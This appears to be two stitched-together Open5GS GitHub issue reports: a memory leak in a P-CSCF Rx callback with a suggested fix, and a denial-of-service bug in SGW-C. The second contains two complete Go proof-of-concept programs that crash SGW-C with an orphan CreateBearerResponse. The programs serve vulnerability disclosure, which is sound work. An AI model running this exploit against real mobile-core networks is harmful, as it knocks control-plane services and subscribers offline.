### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce

`pcscf_rx_aaa_cb()` returns early without freeing *msg when sess_data is NULL, causing a memory leak.

Vulnerable code: https://github.com/open5gs/open5gs/blob/main/tests/volte/diameter-rx-path.c#L1683
```c
ret = fd_sess_state_retrieve(pcscf_rx_reg, session, &sess_data);
ogs_assert(ret == 0);
if (!sess_data) {
    ogs_error("No Session Data");
    return;  // *msg not freed → memory leak
}
```

Thank you.

### Logs

```shell

```

### Expected behaviour

Suggested Fix: goto out rather than return.

```c
ret = fd_sess_state_retrieve(pcscf_rx_reg, session, &sess_data);
ogs_assert(ret == 0);
if (!sess_data) {
    ogs_error("No Session Data");
    goto out;
}

...

out:
    ...
    ret = fd_msg_free(*msg);
    ogs_assert(ret == 0);
    *msg = NULL;
    return;
```

### Observed Behaviour

Memory leak

### eNodeB/gNodeB

_No response_

### UE Models and versions

_No response_

### Open5GS Release, Revision, or Tag

v2.7.6

### Steps to reproduce

### Description
SGW-C can be crashed  by sending an late CreateBearerResponse on S11 under a crafted call flow.
When SGW-C receives the CreateBearerResponse after the relevant UE/session context has been removed or is otherwise not found, it hits an ogs_assert(sgwc_ue) in sgwc_s11_handle_create_bearer_response, causing immediate termination of the control-plane process.

1. Start a new go project inside a new folder: go mod init poc
2. Create a `poc_smf_csr_responder.go`, and `poc_vuln_pa2_orphan_cbr.go` and paste the code below: 

poc_vuln_pa2_orphan_cbr.go
```
package main

import (
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"time"

	"github.com/wmnsk/go-gtp/gtpv2"
	"github.com/wmnsk/go-gtp/gtpv2/ie"
	"github.com/wmnsk/go-gtp/gtpv2/message"
)

// PoC for PB3-003: send an orphan CreateBearerResponse on S11 so SGW-C hits
// ogs_assert(s5c_xact) in sgwc_s11_handle_create_bearer_response().
func main() {
	target := flag.String("target", "", "SGW-C S11 IP (required)")
	port := flag.Int("port", 2123, "GTP-C port for S11")
	apn := flag.String("apn", "internet", "APN to request in CreateSessionRequest")
	imsi := flag.String("imsi", "001011234567890", "IMSI to include in CSR")
	mcc := flag.String("mcc", "001", "Serving network MCC")
	mnc := flag.String("mnc", "01", "Serving network MNC")
	laddr := flag.String("laddr", "", "Local IP to bind (use with --lport to fix source port)")
	lport := flag.Int("lport", 0, "Local UDP port to bind (0=auto)")
	pgwIP := flag.String("pgw-ip", "", "PGW control-plane IP for S5/S8 (default: target)")
	mmeTEID := flag.Uint("mme-teid", 0, "MME S11 TEID to advertise in CSR (0=random non-zero)")
	pgwTEID := flag.Uint("pgw-teid", 0, "PGW S5/S8 TEID to advertise in CSR (0=random non-zero)")
	sgwTEID := flag.Uint("sgw-teid", 0, "Skip CSR: use this SGW S11 TEID directly")
	bearerEbi := flag.Uint("ebi", 5, "EPS Bearer ID to place in CreateBearerResponse when using --sgw-teid")
	seq := flag.Uint("seq", 0, "Base GTPv2 sequence number for CSR (0=random)")
	cbrSeq := flag.Uint("cbr-seq", 0, "Sequence number for CreateBearerResponse (0=auto from --seq)")
	waitDur := flag.Duration("wait", 5*time.Second, "Wait before sending orphan CreateBearerResponse (let transaction timeout)")
	cbrTimeout := flag.Duration("cbr-timeout", 15*time.Second, "How long to wait for CreateBearerRequest from SGW-C on S11")
	flag.Parse()

	if *target == "" {
		log.Fatal("Error: --target is required")
	}
	if *pgwIP == "" {
		*pgwIP = *target
	}
	if *bearerEbi > 255 {
		log.Fatalf("ebi out of range: %d", *bearerEbi)
	}

	rand.Seed(time.Now().UnixNano())

	var lp *net.UDPAddr
	var err error
	if *laddr != "" {
		lp, err = net.ResolveUDPAddr("udp", net.JoinHostPort(*laddr, fmt.Sprintf("%d", *lport)))
		if err != nil {
			log.Fatalf("resolve laddr: %v", err)
		}
	}

	rp, err := net.ResolveUDPAddr("udp", net.JoinHostPort(*target, fmt.Sprintf("%d", *port)))
	if err != nil {
		log.Fatalf("resolve raddr: %v", err)
	}

	conn, err := net.DialUDP("udp", lp, rp)
	if err != nil {
		log.Fatalf("dial udp: %v", err)
	}
	defer conn.Close()

	localIP := ""
	localPort := 0
	if udpAddr, ok := conn.LocalAddr().(*net.UDPAddr); ok && udpAddr.IP != nil {
		localIP = udpAddr.IP.String()
		localPort = udpAddr.Port
	}
	if localIP == "" {
		log.Fatal("local IP unknown (set --laddr)")
	}
	log.Printf("[*] Target %s (local %s:%d)", rp, localIP, localPort)

	baseSeq := uint32(*seq)
	if baseSeq == 0 {
		baseSeq = rand.Uint32() & 0x00ffffff
		if baseSeq == 0 {
			baseSeq = 1
		}
	}
	mmeTeid := randNonZeroUint32(uint32(*mmeTEID))
	pgwTeid := randNonZeroUint32(uint32(*pgwTEID))

	var sgwTeid uint32
	defEbi := uint8(*bearerEbi)

	if *sgwTEID != 0 {
		sgwTeid = uint32(*sgwTEID)
		log.Printf("[*] Skipping CSR bootstrap, using SGW S11 TEID=0x%x EBI=%d", sgwTeid, defEbi)
	} else {
		log.Printf("[*] Sending CreateSessionRequest seq=0x%x mme-teid=0x%x pgw-teid=0x%x", baseSeq, mmeTeid, pgwTeid)
		csr, err := buildCSR(baseSeq, *imsi, *apn, localIP, *pgwIP, *mcc, *mnc, mmeTeid, pgwTeid)
		if err != nil {
			log.Fatalf("build CSR: %v", err)
		}

		csrBytes, err := csr.Marshal()
		if err != nil {
			log.Fatalf("marshal CSR: %v", err)
		}
		if _, err := conn.Write(csrBytes); err != nil {
			log.Fatalf("send CSR: %v", err)
		}

		var errCSR error
		sgwTeid, defEbi, errCSR = waitCSRResponse(conn)
		if errCSR != nil {
			log.Fatalf("CSR response failed: %v", errCSR)
		}
		log.Printf("[+] SGW S11 TEID=0x%x (default EBI=%d)", sgwTeid, defEbi)
	}

	cbSeq, cbEbi, cbTeid, err := waitCreateBearerRequest(conn, *cbrTimeout)
	if err != nil && *cbrSeq == 0 {
		log.Fatalf("waiting for CreateBearerRequest: %v", err)
	}

	if *cbrSeq != 0 {
		cbSeq = uint32(*cbrSeq)
	}
	if cbSeq == 0 {
		cbSeq = baseSeq + 1
		if cbSeq == 0 || cbSeq > 0x00ffffff {
			cbSeq = 1
		}
	}
	if cbEbi == 0 {
		cbEbi = defEbi
	}
	if cbTeid == 0 {
		cbTeid = mmeTeid
	}

	if *waitDur > 0 {
		log.Printf("[*] Waiting %s before sending CreateBearerResponse", *waitDur)
		time.Sleep(*waitDur)
	}

	if err := sendOrphanCreateBearerResponse(conn, cbTeid, cbSeq, cbEbi); err != nil {
		log.Fatalf("send CreateBearerResponse: %v", err)
	}
	log.Println("[*] Done. Watch SGW-C for crash in sgwc_s11_handle_create_bearer_response().")
}

func sendOrphanCreateBearerResponse(conn *net.UDPConn, sgwTeid, seq uint32, ebi uint8) error {
	cause := ie.NewCause(gtpv2.CauseRequestAccepted, 0, 0, 0, nil)
	bctx := ie.NewBearerContextWithinCreateBearerResponse(
		ie.NewEPSBearerID(ebi),
		ie.NewCause(gtpv2.CauseRequestAccepted, 0, 0, 0, nil),
		nil,
		nil,
		nil,
	)

	rsp := message.NewCreateBearerResponse(
		sgwTeid, seq,
		cause,
		bctx,
	)

	b, err := rsp.Marshal()
	if err != nil {
		return fmt.Errorf("marshal CreateBearerResponse: %w", err)
	}
	if _, err := conn.Write(b); err != nil {
		return fmt.Errorf("send CreateBearerResponse: %w", err)
	}

	log.Printf("[+] Sent orphan CreateBearerResponse seq=0x%x teid=0x%x EBI=%d", seq, sgwTeid, ebi)
	return nil
}

func buildCSR(seq uint32, imsi, apn, localIP, pgwIP, mcc, mnc string, mmeTEID, pgwTEID uint32) (*message.CreateSessionRequest, error) {
	if localIP == "" || pgwIP == "" {
		return nil, fmt.Errorf("missing local or PGW IP")
	}

	senderFTEID := ie.NewFullyQualifiedTEID(gtpv2.IFTypeS11MMEGTPC, mmeTEID, localIP, "")
	pgwFTEID := ie.NewFullyQualifiedTEID(gtpv2.IFTypeS5S8PGWGTPC, pgwTEID, pgwIP, "").WithInstance(1)

	bearer := ie.NewBearerContext(
		ie.NewEPSBearerID(5),
		ie.NewBearerQoS(1, 2, 1, 9, 50000, 50000, 50000, 50000),
	)

	return message.NewCreateSessionRequest(
		0, seq,
		ie.NewIMSI(imsi),
		ie.NewMSISDN("0000000000"),
		ie.NewMobileEquipmentIdentity("353490061234560"),
		ie.NewServingNetwork(mcc, mnc),
		ie.NewRATType(gtpv2.RATTypeEUTRAN),
		ie.NewPDNType(gtpv2.PDNTypeIPv4),
		ie.NewSelectionMode(gtpv2.SelectionModeMSorNetworkProvidedAPNSubscribedVerified),
		ie.NewAccessPointName(apn),
		ie.NewAggregateMaximumBitRate(500000, 500000),
		senderFTEID,
		pgwFTEID,
		bearer,
	), nil
}

func waitCSRResponse(conn *net.UDPConn) (uint32, uint8, error) {
	buf := make([]byte, 2048)
	_ = conn.SetReadDeadline(time.Now().Add(6 * time.Second))
	n, err := conn.Read(buf)
	_ = conn.SetReadDeadline(time.Time{})
	if err != nil {
		return 0, 0, fmt.Errorf("read CSR response: %w", err)
	}

	msg, err := message.Parse(buf[:n])
	if err != nil {
		return 0, 0, fmt.Errorf("parse CSR response: %w", err)
	}
	res, ok := msg.(*message.CreateSessionResponse)
	if !ok {
		return 0, 0, fmt.Errorf("unexpected message type %T", msg)
	}
	if res.Cause == nil {
		return 0, 0, fmt.Errorf("no Cause IE in response")
	}
	cause, err := res.Cause.Cause()
	if err != nil {
		return 0, 0, fmt.Errorf("parse Cause: %w", err)
	}
	if cause != gtpv2.CauseRequestAccepted && cause != gtpv2.CauseRequestAcceptedPartially {
		return 0, 0, fmt.Errorf("CSR rejected: cause=%d", cause)
	}
	if res.SenderFTEIDC == nil {
		return 0, 0, fmt.Errorf("no SGW S11 F-TEID in response")
	}
	sgwTeid, err := res.SenderFTEIDC.TEID()
	if err != nil {
		return 0, 0, fmt.Errorf("parse SGW TEID: %w", err)
	}

	ebi := uint8(0)
	if res.EBI != nil {
		if v, err := res.EBI.EPSBearerID(); err == nil {
			ebi = v
		}
	}
	if ebi == 0 {
		for _, b := range res.BearerContextsCreated {
			if v, err := b.EPSBearerID(); err == nil {
				ebi = v
				break
			}
		}
	}
	if ebi == 0 {
		ebi = 5
	}
	return sgwTeid, ebi, nil
}

func randNonZeroUint32(v uint32) uint32 {
	if v != 0 {
		return v
	}
	r := rand.Uint32()
	if r == 0 {
		return 1
	}
	return r
}

func waitCreateBearerRequest(conn *net.UDPConn, timeout time.Duration) (uint32, uint8, uint32, error) {
	deadline := time.Now().Add(timeout)
	buf := make([]byte, 2048)
	for {
		_ = conn.SetReadDeadline(deadline)
		n, _, err := conn.ReadFrom(buf)
		if err != nil {
			return 0, 0, 0, fmt.Errorf("read CBR: %w", err)
		}
		msg, err := message.Parse(buf[:n])
		if err != nil {
			log.Printf("ignored undecodable packet while waiting CBR: %v", err)
			continue
		}
		switch cbr := msg.(type) {
		case *message.CreateBearerRequest:
			ebi := uint8(0)
			for _, bc := range cbr.BearerContexts {
				if bc == nil {
					continue
				}
				if v, err := bc.EPSBearerID(); err == nil {
					ebi = v
					break
				}
			}
			return cbr.Sequence(), ebi, cbr.TEID(), nil
		default:
			log.Printf("ignored %s while waiting CBR", msg.MessageTypeName())
		}
	}
}
```

poc_smf_csr_responder.go
```
package main

import (
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"time"

	"github.com/wmnsk/go-gtp/gtpv2"
	"github.com/wmnsk/go-gtp/gtpv2/ie"
	"github.com/wmnsk/go-gtp/gtpv2/message"
)

// PoC-SMF: minimal PGW/SMF-side responder for CreateSessionRequest on S5-C.
// Listens on UDP/2123, parses CSR from SGW-C, and returns a simple
// CreateSessionResponse so the MME-side PoC can complete.
func main() {
	laddr := flag.String("laddr", "0.0.0.0", "Local IP to bind for S5-C (use the IP SGW-C will send to)")
	port := flag.Int("port", 2123, "GTP-C port")
	paa := flag.String("paa", "10.60.0.10", "PDN Address Allocation to return")
	ebi := flag.Uint("ebi", 5, "Default bearer EBI to echo in BearerContextCreated")
	dedEbi := flag.Uint("ded-ebi", 6, "Dedicated bearer EBI to use in CreateBearerRequest")
	pgwCtrlTEID := flag.Uint("pgw-teid", 0, "PGW S5-C TEID to advertise (0=random non-zero)")
	pgwUTeid := flag.Uint("pgw-uteid", 0, "PGW S5-U TEID to advertise (0=random non-zero)")
	delay := flag.Duration("delay", 0, "Optional delay before sending CSR response (simulates slow SMF)")
	cbReqDelay := flag.Duration("cbreq-delay", 1*time.Second, "Delay between CSR response and CreateBearerRequest")
	cbReqSeq := flag.Uint("cbreq-seq", 0, "Sequence number for CreateBearerRequest (0=random)")
	flag.Parse()

	rand.Seed(time.Now().UnixNano())

	addr, err := net.ResolveUDPAddr("udp", net.JoinHostPort(*laddr, fmt.Sprintf("%d", *port)))
	if err != nil {
		log.Fatalf("resolve laddr: %v", err)
	}
	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		log.Fatalf("listen udp: %v", err)
	}
	defer conn.Close()

	log.Printf("[*] PoC-SMF listening on %s (paa=%s ebi=%d)", addr, *paa, *ebi)

	buf := make([]byte, 4096)
	for {
		n, raddr, err := conn.ReadFromUDP(buf)
		if err != nil {
			log.Printf("read err: %v", err)
			continue
		}
		msg, err := message.Parse(buf[:n])
		if err != nil {
			log.Printf("ignored undecodable packet from %s: %v", raddr, err)
			continue
		}

		req, ok := msg.(*message.CreateSessionRequest)
		if !ok {
			log.Printf("ignored %s from %s", msg.MessageTypeName(), raddr)
			continue
		}

		sgwTeid := uint32(0)
		if req.SenderFTEIDC != nil {
			if v, err := req.SenderFTEIDC.TEID(); err == nil {
				sgwTeid = v
			}
		}
		if sgwTeid == 0 {
			log.Printf("CSR missing sender F-TEID; cannot respond to %s", raddr)
			continue
		}

		seq := req.Sequence()
		pgwCtrl := randNonZeroUint32(uint32(*pgwCtrlTEID))
		pgwU := randNonZeroUint32(uint32(*pgwUTeid))

		if *delay > 0 {
			log.Printf("[*] Got CSR seq=0x%x teid=0x%x from %s; delaying %s", seq, sgwTeid, raddr, *delay)
			time.Sleep(*delay)
		} else {
			log.Printf("[*] Got CSR seq=0x%x teid=0x%x from %s", seq, sgwTeid, raddr)
		}

		if err := sendCSRResponse(conn, raddr, sgwTeid, seq, pgwCtrl, pgwU, *paa, uint8(*ebi)); err != nil {
			log.Printf("send CSR response failed: %v", err)
			continue
		}

		if *cbReqDelay > 0 {
			time.Sleep(*cbReqDelay)
		}
		cbSeq := uint32(*cbReqSeq)
		if cbSeq == 0 {
			cbSeq = rand.Uint32() & 0x007fffff
			if cbSeq == 0 {
				cbSeq = 1
			}
		}
		if err := sendCreateBearerRequest(conn, raddr, sgwTeid, cbSeq, uint8(*ebi), uint8(*dedEbi), pgwCtrl, pgwU); err != nil {
			log.Printf("send CreateBearerRequest failed: %v", err)
		}
	}
}

func sendCSRResponse(conn *net.UDPConn, raddr *net.UDPAddr, sgwTeid, seq, pgwCtrlTeid, pgwUTeid uint32, paa string, ebi uint8) error {
	localIP := ""
	if conn.LocalAddr() != nil {
		if u, ok := conn.LocalAddr().(*net.UDPAddr); ok && u.IP != nil {
			localIP = u.IP.String()
		}
	}
	if localIP == "" {
		return fmt.Errorf("local IP unknown")
	}

	cause := ie.NewCause(gtpv2.CauseRequestAccepted, 0, 0, 0, nil)
	// Provide both instance 0 (SenderFTEID) and 1 (PGW S5C F-TEID) to satisfy parsers.
	ctrlFTEID0 := ie.NewFullyQualifiedTEID(gtpv2.IFTypeS5S8PGWGTPC, pgwCtrlTeid, localIP, "")
	ctrlFTEID1 := ie.NewFullyQualifiedTEID(gtpv2.IFTypeS5S8PGWGTPC, pgwCtrlTeid, localIP, "").WithInstance(1)
	pa := ie.NewPDNAddressAllocation(paa)

	bctx := ie.NewBearerContext(
		ie.NewEPSBearerID(ebi),
		ie.NewCause(gtpv2.CauseRequestAccepted, 0, 0, 0, nil),
		ie.NewFullyQualifiedTEID(gtpv2.IFTypeS5S8PGWGTPU, pgwUTeid, localIP, "").WithInstance(2),
	)

	rsp := message.NewCreateSessionResponse(
		sgwTeid, seq,
		cause,
		ctrlFTEID0,
		ctrlFTEID1,
		pa,
		bctx,
	)

	b, err := rsp.Marshal()
	if err != nil {
		return fmt.Errorf("marshal CSR response: %w", err)
	}
	if _, err := conn.WriteToUDP(b, raddr); err != nil {
		return fmt.Errorf("send CSR response: %w", err)
	}
	log.Printf("[+] Sent CreateSessionResponse seq=0x%x teid=0x%x -> %s (ctrl=0x%x u=0x%x)", seq, sgwTeid, raddr, pgwCtrlTeid, pgwUTeid)
	return nil
}

func randNonZeroUint32(v uint32) uint32 {
	if v != 0 {
		return v
	}
	r := rand.Uint32()
	if r == 0 {
		return 1
	}
	return r
}

func sendCreateBearerRequest(conn *net.UDPConn, raddr *net.UDPAddr, sgwTeid, seq uint32, linkedEbi, dedEbi uint8, pgwCtrlTeid, pgwUTeid uint32) error {
	localIP := ""
	if conn.LocalAddr() != nil {
		if u, ok := conn.LocalAddr().(*net.UDPAddr); ok && u.IP != nil {
			localIP = u.IP.String()
		}
	}
	if localIP == "" {
		return fmt.Errorf("local IP unknown")
	}

	// Required IEs for Open5GS SGW-C path.
	linked := ie.NewEPSBearerID(linkedEbi)
	pgwU := ie.NewFullyQualifiedTEID(gtpv2.IFTypeS5S8PGWGTPU, pgwUTeid, localIP, "").WithInstance(1)
	qos := ie.NewBearerQoS(1, 1, 1, 9, 200000, 200000, 200000, 200000)

	bctx := ie.NewBearerContextWithinCreateBearerRequest(
		ie.NewEPSBearerID(dedEbi),
		nil, // TFT
		qos,
		nil, nil, nil, nil, nil,
		pgwU,
	)

	cbReq := message.NewCreateBearerRequest(
		sgwTeid, seq,
		linked,
		bctx,
	)

	b, err := cbReq.Marshal()
	if err != nil {
		return fmt.Errorf("marshal CBReq: %w", err)
	}
	if _, err := conn.WriteToUDP(b, raddr); err != nil {
		return fmt.Errorf("send CBReq: %w", err)
	}
	log.Printf("[+] Sent CreateBearerRequest seq=0x%x teid=0x%x linked-ebi=%d ded-ebi=%d", seq, sgwTeid, linkedEbi, dedEbi)
	return nil
}
```
